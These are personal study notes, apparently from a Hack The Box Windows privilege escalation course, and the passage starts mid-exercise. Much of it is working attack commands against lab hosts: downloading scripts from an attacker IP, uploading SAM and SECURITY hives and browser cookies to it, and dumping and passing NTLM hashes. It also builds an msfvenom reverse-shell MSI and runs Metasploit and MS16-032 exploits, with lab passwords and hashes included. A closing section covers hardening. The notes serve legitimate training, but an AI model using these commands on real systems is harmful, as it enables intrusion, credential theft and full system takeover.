	certutil -urlcache -split -f "http://10.10.16.13:8000/PSUpload.ps1"
	Import-Module .\PSUpload.ps1
	
	python -m uploadserver 8001
	Invoke-FileUpload -Uri http://10.10.16.13:8001/upload -File cookies.sqlite
	
	python3 cookieextractor.py --dbpath '/home/eric/Desktop/htb/notes/HTB_academy/Windows_Privilege_escalation/exercise_releated/cookies.sqlite' --host slack --cookie d
	
	(10, '', 'd', 'xoxd-VGhpcyBpcyBhIGNvb2tpZSB0byBzaW11bGF0ZSBhY2Nlc3MgdG8gU2xhY2ssIHN0ZWFsaW5nIGEgY29va2llIGZyb20gYSBicm93c2VyLg==', '.api.slacktestapp.com', '/', 7975292868, 1663945037085000, 1663945037085002, 0, 0, 0, 1, 0, 2)
	cookie: xoxd-VGhpcyBpcyBhIGNvb2tpZSB0byBzaW11bGF0ZSBhY2Nlc3MgdG8gU2xhY2ssIHN0ZWFsaW5nIGEgY29va2llIGZyb20gYSBicm93c2VyLg==
	
	- go to sign in page at slacktestapp.com on the rdp server
	Username: jeff and Password Webmaster001!

- Follow section
	xfreerdp +bitmap-cache /network:auto /dynamic-resolution /compression-level:2 /u:jeff /p:'Webmaster001!' /v:10.129.203.122 /tls-seclevel:0 /timeout:80000
	
	
	- Additionals
		- Confirm restic.exe is on the computer
	
	
	mkdir E:\restic3; restic.exe -r E:\restic3 init
	
	
	$env:RESTIC_PASSWORD = 'Password'
	restic.exe -r E:\restic3\ backup C:\SampleFolder
	
	- Look into the document (backup.conf) at Desktop

- Follow section on checking backups (## Roles and Services)

	PS C:\htb> restic.exe -r E:\restic\ snapshots
	
	restic.exe -r E:\restic\ restore b2f5caa0 --target C:\Restore
	
	Superbackup!
	
	try: 02d25030
	
	- try webapp restoration
	restic.exe -r E:\restic\ restore 02d25030 --target C:\Restore
	
	- in web.config
	Injection;User Id=Administrator;Password='NewSuperPa$$w0rd!
	
	try: 4e7bd0cd
	restic.exe -r E:\restic\ restore 4e7bd0cd --target C:\Restore
	
	transfer files:
	
	certutil -urlcache -split -f "http://10.10.16.13:8000/PSUpload.ps1"
	Import-Module .\PSUpload.ps1
	
	IEX(New-Object Net.WebClient).DownloadString('http://10.10.16.13:8000/PSUpload.ps1')
	Invoke-FileUpload -Uri http://10.10.16.13:8001/upload -File SAM 
	Invoke-FileUpload -Uri http://10.10.16.13:8001/upload -File SECURITY
	
	secretsdump.py -sam SAM -system SYSTEM LOCAL

- Optional EX::
	enable the reg key for pth. 

	reg add HKLM\System\CurrentControlSet\Control\Lsa /t REG_DWORD /v DisableRestrictedAdmin /d 0x0 /f
	
	impacket-psexec Administrator@10.129.203.122 -hashes :bac9dc5b7b4bec1d83e0e9c04b477f26
	
	impacket-psexec administrator@10.129.203.122 -hashes :bac9dc5b7b4bec1d83e0e9c04b477f26
	
	reg add HKLM\System\CurrentControlSet\Control\Lsa /t REG_DWORD /v DisableRestrictedAdmin /d 0x0 /f
	
	xfreerdp +bitmap-cache /network:auto /dynamic-resolution /compression-level:2 /u:administrator /pth:bac9dc5b7b4bec1d83e0e9c04b477f26 /v:10.129.203.122 /tls-seclevel:0 /timeout:80000
```

#### Miscellaneous Techniques

```
## Living off the land techniques
- The [LOLBAS project](https://lolbas-project.github.io/) documents binaries, scripts, and libraries that can be used for "living off the land" techniques on Windows systems. 
 
	-> Each of these binaries, scripts and libraries is a Microsoft-signed file that is either native to the operating system or can be downloaded directly from Microsoft and have unexpected functionality useful to an attacker. 
	Some interesting functionality may include:
|Code execution|Code compilation|File transfers|
|Persistence|UAC bypass|Credential theft|
|Dumping process memory|Keylogging|Evasion|
|DLL hijacking|||

- Transferring File with Certutil
PS C:\htb> certutil.exe -urlcache -split -f http://10.10.14.3:8080/shell.bat shell.bat

- Encoding File with Certutil
C:\htb> certutil -encode file1 encodedfile

- Decoding File with Certutil
C:\htb> certutil -decode encodedfile file2


## Always Install elevted
- This setting can be set via Local Group Policy by setting `Always install with elevated privileges` to `Enabled` under the following paths.

- `Computer Configuration\Administrative Templates\Windows Components\Windows Installer`
    
- `User Configuration\Administrative Templates\Windows Components\Windows Installer`

- In Local Group Policy Editor:
- `Computer Configuration\Administrative Templates\Windows Components\Windows Installer`
    
- `User Configuration\Administrative Templates\Windows Components\Windows Installer`

- Enumerating Always Install Elevated Settings
PS C:\htb> reg query HKEY_CURRENT_USER\Software\Policies\Microsoft\Windows\Installer

PS C:\htb> reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer

- Generating MSI Package
msfvenom -p windows/shell_reverse_tcp lhost=10.10.14.3 lport=9443 -f msi > aie.msi

- Executing MSI Package
C:\htb> msiexec /i c:\users\htb-student\desktop\aie.msi /quiet /qn /norestart

- Catching Shell
nc -lvnp 9443

C:\Windows\system32>whoami
whoami
nt authority\system

## CVE-2019-1388
- [CVE-2019-1388](https://nvd.nist.gov/vuln/detail/CVE-2019-1388) was a privilege escalation vulnerability in the Windows Certificate Dialog, which did not properly enforce user privileges. 
 
	-> The issue was in the UAC mechanism, which presented an option to show information about an executable's certificate, opening the Windows certificate dialog when a user clicks the link. 
	
	-> The `Issued By` field in the General tab is rendered as a hyperlink if the binary is signed with a certificate that has Object Identifier (OID) `1.3.6.1.4.1.311.2.1.10`. 
	
	-> This OID value is identified in the [wintrust.h](https://docs.microsoft.com/en-us/windows/win32/api/wintrust/) header as [SPC_SP_AGENCY_INFO_OBJID](https://docs.microsoft.com/en-us/windows/win32/api/wincrypt/nf-wincrypt-cryptformatobject) which is the `SpcSpAgencyInfo` field in the details tab of the certificate dialog.
	
	 -> If it is present, a hyperlink included in the field will render in the General tab. 
	 
	 -> This vulnerability can be exploited easily using an old Microsoft-signed executable ([hhupd.exe](https://packetstormsecurity.com/files/14437/hhupd.exe.html)) that contains a certificate with the `SpcSpAgencyInfo` field populated with a hyperlink.

- Right click on hhupd.exe and select run as administrator

- Click ok and see if link launch and certificate dialog closes

- If link launch is vulnerable, also check system shell is running through task manager.

- View page source and open the saving page

- Enter c:\windows\system32\cmd.exe and hit enter in the file path

Note: The steps above were done using the Chrome browser and may differ slightly in other browsers.

## Scheduled Tasks
- Enumerating Scheduled Tasks
C:\htb>  schtasks /query /fo LIST /v

- Enumerating Scheduled Tasks with PowerShell
PS C:\htb> Get-ScheduledTask | select TaskName,State

- Checking Permissions on C:\Scripts Directory
C:\htb> .\accesschk64.exe /accepteula -s -d C:\Scripts\

## User/Computer Description Field
- Though more common in Active Directory, it is possible for a sysadmin to store account details (such as a password) in a computer or user's account description field. 
 
	-> We can enumerate this quickly for local users using the [Get-LocalUser](https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.localaccounts/get-localuser?view=powershell-5.1) cmdlet.

- Checking Local User Description Field
PS C:\htb> Get-LocalUser

- Enumerating Computer Description Field with Get-WmiObject Cmdlet
PS C:\htb> Get-WmiObject -Class Win32_OperatingSystem | select Description

## Mounting VHDX/VMDX
- During our enumeration, we will often come across interesting files both locally and on network share drives. 
 
	-> We may find passwords, SSH keys or other data that can be used to further our access. The tool [Snaffler](https://github.com/SnaffCon/Snaffler) can help us perform thorough enumeration that we could not otherwise perform by hand. 
	
	-> The tool searches for many interesting file types, such as files containing the phrase "pass" in the file name, KeePass database files, SSH keys, web.config files, and many more.

- Three specific file types of interest are `.vhd`, `.vhdx`, and `.vmdk` files. These are `Virtual Hard Disk`, `Virtual Hard Disk v2` (both used by Hyper-V), and `Virtual Machine Disk` (used by VMware). 
 
	-> Let's assume that we land on a web server and have had no luck escalating privileges, so we resort to hunting through network shares. 
	
	-> We come across a backups share hosting a variety of `.VMDK` and `.VHDX` files whose filenames match hostnames in the network. 
	
	-> One of these files matches a host that we were unsuccessful in escalating privileges on, but it is key to our assessment because there is an Active Domain admin session. 
	
	->If we can escalate to SYSTEM, we can likely steal the user's NTLM password hash or Kerberos TGT ticket and take over the domain.

- Mount VMDK on Linux
guestmount -a SQL01-disk1.vmdk -i --ro /mnt/vmdk

- Mount VHD/VHDX on Linux
guestmount --add WEBSRV10.vhdx  --ro /mnt/vhdx/ -m /dev/sda1

- Right click to mount 

- Right click and choose `Map Virtual disk` from the menu

- Retrieving Hashes using Secretsdump.py
secretsdump.py -sam SAM -security SECURITY -system SYSTEM LOCAL

## Questions
Q:Using the techniques in this section, find the cleartext password for an account on the target host.
- Directly from section (## User/Computer Description Field)
Get-LocalUser
Get-WmiObject -Class Win32_OperatingSystem | select Description

secsvc          True    Network scanner - do not change password: !QAZXSW@3edc
	- Searching for description field section
```

#### Windows Server
```
## Overview
- Windows Server 2008/2008 R2 were made end-of-life on January 14, 2020. Over the years, Microsoft has added enhanced security features to subsequent versions of Windows Server.
 
	-> It is not very common to encounter Server 2008 during an external penetration test, but I often encounter it during internal assessments.

## Server 2008 Case Study
- Often during my assessments, I come across legacy operating system versions, both Windows and Linux.
 
	-> Sometimes these are merely forgotten systems that the client can quickly act on and decommission, while other times, these can be critical systems that can not be easily removed or replaced. 
	
	-> Penetration testers need to understand the client's core business and hold discussions during the assessment, especially when dealing with scanning/enumeration and attacking legacy systems, and during the reporting phase. 
	
	-> Not every environment is the same, and we must take many factors into account when writing recommendations for findings and assigning risk ratings. 
	
	-> For example, medical settings may be running mission-critical software on Windows XP/7 or Windows Server 2003/2008 systems. Without understanding the reasoning "why," it is not good enough to merely tell them to remove the systems from the environment. 
	
	-> If they are running costly MRI software that the vendor no longer supports, it could cost large sums of money to transition to new systems. 
	
	-> In this case, we would have to look at other mitigating controls the client has in place, such as network segmentation, custom extended support from Microsoft, etc

- We can et cmd through C:\Windows\System32\cmd.exe

- Querying Current Patch Level
C:\htb> wmic qfe

- Running Sherlock
PS C:\htb> Set-ExecutionPolicy bypass -Scope process

PS C:\htb> Import-Module .\Sherlock.ps1
PS C:\htb> Find-AllVulns

- Obtaining a Meterpreter Shell
msf6 exploit(windows/smb/smb_delivery) > search smb_delivery
msf6 exploit(windows/smb/smb_delivery) > use 0
msf6 exploit(windows/smb/smb_delivery) > show options 
msf6 exploit(windows/smb/smb_delivery) > show targets
msf6 exploit(windows/smb/smb_delivery) > set target 0
msf6 exploit(windows/smb/smb_delivery) > exploit 
rundll32.exe \\10.10.14.3\lEUZam\test.dll,0

- Rundll Command on Target Host
C:\htb> rundll32.exe \\10.10.14.3\lEUZam\test.dll,0

-  Receiving Reverse Shell
msf6 exploit(windows/smb/smb_delivery) > [*] Sending stage (175174 bytes) to 10.129.43.15
[*] Meterpreter session 1 opened (10.10.14.3:4444 -> 10.129.43.15:49609) at 2021-05-12 15:55:05 -0400

- Searching for Local Privilege Escalation Exploit(https://www.rapid7.com/blog/post/2015/08/11/metasploit-local-exploit-suggester-do-less-get-more/) for exploitation.

msf6 exploit(windows/smb/smb_delivery) > search 2010-3338
use 0

- Migrating to a 64-bit Process
msf6 post(multi/recon/local_exploit_suggester) > sessions -i 1
[*] Starting interaction with 1...
meterpreter > getpid
meterpreter > ps
meterpreter > migrate 2796
meterpreter > background

- Setting Privilege Escalation Module Options
msf6 exploit(windows/local/ms10_092_schelevator) > set SESSION 1
msf6 exploit(windows/local/ms10_092_schelevator) > set lhost 10.10.14.3
msf6 exploit(windows/local/ms10_092_schelevator) > set lport 4443
msf6 exploit(windows/local/ms10_092_schelevator) > show options

- Receiving Elevated Reverse Shell
msf6 exploit(windows/local/ms10_092_schelevator) > exploit
meterpreter > getuid
meterpreter > sysinfo

// Questions
Q:Obtain a shell on the target host, enumerate the system and escalate privileges. Submit the contents of the flag.txt file on the Administrator Desktop.
- Locate CMD first (through openning file folder)
	- Follow section (ref ## Server 2008 Case Study)
```

## Dealing with End of Life Systems
## Legacy Operating Systems

```
## Overview
- While this module primarily focuses on modern operating systems (Windows 10/Windows Server 2016), as we have seen, certain issues (i.e., vulnerable software, misconfigurations, careless users, etc.) cannot be solved by merely upgrading to the latest and greatest Windows desktop and server versions. 
 
	-> That being said, specific security improvements have been made over the years that no longer affect modern, supported versions of the Windows operating system. 
	
	-> During our assessments, we will undoubtedly encounter legacy operating systems (especially against large organizations such as universities, hospitals/medical organizations, insurance companies, utilities, state/local government). 
	
	-> It is essential to understand the differences and certain additional flaws that we need to check to ensure our assessments are as thorough as possible.

## End of Life Systems (EOL)

- Over time, Microsoft decides to no longer offer ongoing support for specific operating system versions. When they stop supporting a version of Windows, they stop releasing security updates for the version in question. 
 
	-> Windows systems first go into an "extended support" period before being classified as end-of-life or no longer officially supported. 
	
	-> Microsoft continues to create security updates for these systems offered to large organizations through custom long-term support contracts. 
```
	
#### Windows Desktop Versions
```
## Overview
- Windows 7 was made end-of-life on January 14, 2020, but is still in use in many environments.

## Windows 7 case study
- To this date, estimates state that there may be over 100 million users still on Windows 7. 
 
	-> According to [NetMarketShare](https://www.netmarketshare.com/operating-system-market-share.aspx), as of November 2020, Windows 7 was the second most used desktop operating system after Windows 10. 
	
	-> Windows 7 is standard in large companies across the education, retail, transportation, healthcare, financial, government, and manufacturing sectors.

- Install Python Dependencies (local VM only)
areaeric@htb[/htb]$ sudo wget https://files.pythonhosted.org/packages/28/84/27df240f3f8f52511965979aad7c7b77606f8fe41d4c90f2449e02172bb1/setuptools-2.0.tar.gz
areaeric@htb[/htb]$ sudo tar -xf setuptools-2.0.tar.gz
areaeric@htb[/htb]$ cd setuptools-2.0/
areaeric@htb[/htb]$ sudo python2.7 setup.py install

- Gathering Systeminfo Command Output
C:\htb> systeminfo
	-> save output to text file and transfer to attack VM.

- Updating the Local Microsoft Vulnerability Database
sudo python2.7 windows-exploit-suggester.py --update

- Running Windows Exploit Suggester
python2.7 windows-exploit-suggester.py  --database 2021-05-13-mssb.xls --systeminfo win7lpe-systeminfo.txt 

- Can also use metapslit local exploit suggester module [local exploit suggester module](https://www.rapid7.com/blog/post/2015/08/11/metasploit-local-exploit-suggester-do-less-get-more/)

- Exploiting MS16-032 with PowerShell PoC
PS C:\htb> Set-ExecutionPolicy bypass -scope process

Execution Policy Change
The execution policy helps protect you from scripts that you do not trust. Changing the execution policy might expose
you to the security risks described in the about_Execution_Policies help topic. Do you want to change the execution
policy?
[Y] Yes  [N] No  [S] Suspend  [?] Help (default is "Y"): A
[Y] Yes  [N] No  [S] Suspend  [?] Help (default is "Y"): Y


PS C:\htb> Import-Module .\Invoke-MS16-032.ps1
PS C:\htb> Invoke-MS16-032

- Spawning a SYSTEM Console
C:\htb> whoami

nt authority\system

## Questions
Q: Enumerate the target host and escalate privileges to SYSTEM. Submit the contents of the flag on the Administrator Desktop.
- Follow directly from secton (ref to ## Windows 7 Case Study)
```

## Closing thoughts
#### Windows Hardening
```
## Overview
- Proper hardening can eliminate most, if not all, opportunities for local privilege escalation. 
 
	-> The following steps should be taken, at a minimum, to reduce the risk of an attacker gaining system-level access.

## Updates and Patching

- [Microsoft's Update Orchestrator](https://docs.microsoft.com/en-us/windows/deployment/update/how-windows-update-works) will run updates for you in the background based on your configured settings. 
	
	-> For most, this means it will download and install the most recent updates for you behind the scenes. 
	
	-> Keep in mind some updates require a restart to take effect, so it's a good practice to restart your hosts regularly.
	
	-> For those working in an enterprise environment, you can set up a WSUS server within your environment so that each computer is not reaching out to download them individually. 
	
	-> Instead, they can reach out to the configured WSUS server for any updates required.

## Configuration Management

- In Windows, configuration management can easily be achieved through the use of Group Policy. 
 
	-> Group Policy will allow us to centrally manage user and computer settings and preferences across your environment. 
	
	-> This can be achieved by using the Group Policy Management Console (GPMC) or via Powershell.

## User Management
- Limiting the number of user and admin accounts on each system and ensuring that login attempts (valid/invalid) are logged and monitored can go a long way for system hardening and monitoring potential problems.
 
	-> It is also good to enforce a strong password policy and two-factor authentication, rotate passwords periodically and restrict users from reusing old passwords by using the `Password Policy` settings in Group Policy.
	
	-> These settings can be found using GPMC in the path `Computer Configuration\Windows Settings\Security Settings\Account Policies\Password Policy`. 
	
	-> We should also check that users are not placed into groups that give them excessive rights unnecessary for their day-to-day tasks (a regular user having Domain Admin rights, for example) and enforce login restrictions for administrator accounts.

---

## Audit

- Perform periodic security and configuration checks of all systems. 
- 
	-> There are several security baselines such as the DISA [Security Technical Implementation Guides (STIGs)](https://public.cyber.mil/stigs/) or Microsoft's [Security Compliance Toolkit](https://docs.microsoft.com/en-us/windows/security/threat-protection/windows-security-configuration-framework/security-compliance-toolkit-10) that can be followed to set a standard for security in your environment. 
	
	-> Many compliance frameworks exist, such as [ISO27001](https://www.iso.org/isoiec-27001-information-security.html), [PCI-DSS](https://www.pcisecuritystandards.org/pci_security/), and [HIPAA](https://www.hhs.gov/hipaa/for-professionals/security/index.html) which can be used by an organization to help establish security baselines. 
	
	-> These should all be used as reference guides and not the basis for a security program. 
	
	-> A strong security program should have controls tailored to the organization's needs, operating environment, and the types of data they store and process (i.e., personal health information, financial data, trade secrets, or publicly available information).

## Logging

- Proper logging and log correlation can make all the difference when troubleshooting an issue or hunting a potential threat in your network. 
 
	-> Below we will discuss some apps and logs that can help improve your security posture on a Windows host.

## Sysmon

- Sysmon is a tool built by Microsoft and included in the Sysinternals Suite that enhances the logging and event collection capability in Windows.
 
	-> Sysmon provides detailed info about any processes, network connections, file reads or writes, login attempts and successes, and much much more. 
	
	-> These logs can be correlated and shipped out to a SIEM for analysis and provide a better understanding of what we have going on in our environment. 
	
	-> Sysmon is persistent on host and will begin writing logs at startup. 
	
	-> It's an extremely helpful tool if appropriately implemented. For more details about Sysmon, check out [sysmon info](https://docs.microsoft.com/en-us/sysinternals/downloads/sysmon).

- Any logs Sysmon writes will be stored in the hive: `Applications and Service Logs\Microsoft\Windows\Sysmon\Operational`. 
	
	-> You can view these by utilizing the event viewer application and drilling into the hive.

## Network and Host Logs.

- Tools like [PacketBeat](https://www.elastic.co/beats/packetbeat), IDS\IPS implementations such as Security Onion sensors, and other network monitoring solutions can help complete the picture for your administrators. 
 
	-> They collect and ship network traffic logs to your monitoring solutions and SIEMS.


## Key Hardening Measures

- This is by no means an exhaustive list, but some simple hardening measures are:
	
	- Secure boot and disk encryption with BitLocker should be enabled and in use.
	- Audit writable files and directories and any binaries with the ability to launch other apps.
	- Ensure that any scheduled tasks and scripts running with elevated privileges specify any binaries or executables using the absolute path.
	- Do not store credentials in cleartext in world-readable files on the host or in shared drives.
	- Clean up home directories and PowerShell history.
	- Ensure that low-privileged users cannot modify any custom libraries called by programs.
	- Remove any unnecessary packages and services that potentially increase the attack surface.
	- Utilize the Device Guard and Credential Guard features built-in by Microsoft to Windows 10 and most new Server Operating Systems.
	- Utilize Group Policy to enforce any configuration changes needed to company systems.

- You may notice, if you take the time to read through a STIG checklist, many of these measures are included in the checks. 
 
	-> Be mindful of what your environments use, and determine how these measures will affect the ability to accomplish the mission. 
	
	-> Do not blindly implement widespread hardening measures across your network, as what works for one organization may not work for another. 
	
	-> Knowing you are trying to protect and then applying the appropriate measures per the requirements of the business is critical.

## Conclusion

- As we have seen, there are many different ways to escalate privileges on Windows systems - from simple misconfigurations and public exploits for known vulnerable services, to exploit development based on custom libraries and executables.
 
	-> Once administrator or SYSTEM level access is obtained, it becomes easier to use it as a pivot point for further network exploitation. System hardening is equally critical for small companies and large enterprises. 
	
	-> Watching the attack trends of this day and age, we can see attackers no longer care who the victim is, as long as they can get what they want out of the exchange.
	
	 -> Best practice guidelines and controls exist in many different forms. Reviews should include a mix of hands-on manual testing and automated configuration scanning with tools like Nessus, followed by validation of the results.
	 
	-> While patching for the latest and greatest attacks and implementing sophisticated monitoring capabilities, do not forget the basics and "low hanging fruit" covered throughout this module.
```

#### Skills assessment I
```
Due to the amount of effort required, they have been put up on the write-up section.
```

Cool extra thing:
Note: Depending on how we gain access to a system we may not have many directories that are writeable by our user to upload tools. 

It is always a safe bet to upload tools to `C:\Windows\Temp` because the `BUILTIN\Users` group has write access.





